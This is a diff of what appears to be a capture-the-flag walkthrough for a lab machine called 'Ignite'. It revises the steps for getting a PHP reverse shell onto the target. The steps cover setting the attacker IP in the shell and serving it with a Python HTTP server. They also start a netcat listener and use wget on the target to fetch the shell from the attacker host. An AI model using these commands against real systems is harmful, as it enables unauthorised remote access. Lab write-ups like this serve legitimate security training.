@@ -238,32 +238,25 @@ Verify attacker machine ip address
 
 ![Attacker IP](assets/ignite-27a.png)  
 
-Use the same shell that failed to upload earlier in the process.  
+Modify a php reverse shell to include the attacker IP and an appropriate port. 
 
-![PHP Shell](assets/ignite-29.png)
+![Shell Edit](assets/ignite-29a.png)  
 
-Ensure Attacker IP is in the reverse shell:  
+Start a simple server in the upper-right pane.  
 
-![PHP Shell](assets/ignite-28.png)  
+`:> python -m http.server 4445`
 
-Use TMUX and split the screen to make working on both machines simpler.  
-
-`:> tmux` then `ctrl + b` then `"`  
-![TMUX Horizontal Split](assets/ignite-30a.png)  
-
-Start a simple server in one pane.  
-
-`:> python -m http.server 9999`
+![Python Shell](assets/ignite-30a.png)
 
 Start a netcat listener in the other pane, using the port in the reverse shell.
 
-`:> nc -lvnp 5555`  
+`:> nc -lvnp 8888`  
 
-![reverse shell setup](assets/ignite-31a.png)  
+![reverse shell setup](assets/ignite-31.png)  
 
 From the target device, use wget to download the reverse shell from the attacking device   
 
-`:> wget -O myRevShell.php 10.6.15.233:8000/prs.php`  
+`:> wget -O myRevShell.php 10.6.15.233:4445/prs.php`  
 
 ![Download](assets/ignite-32.png)  
 
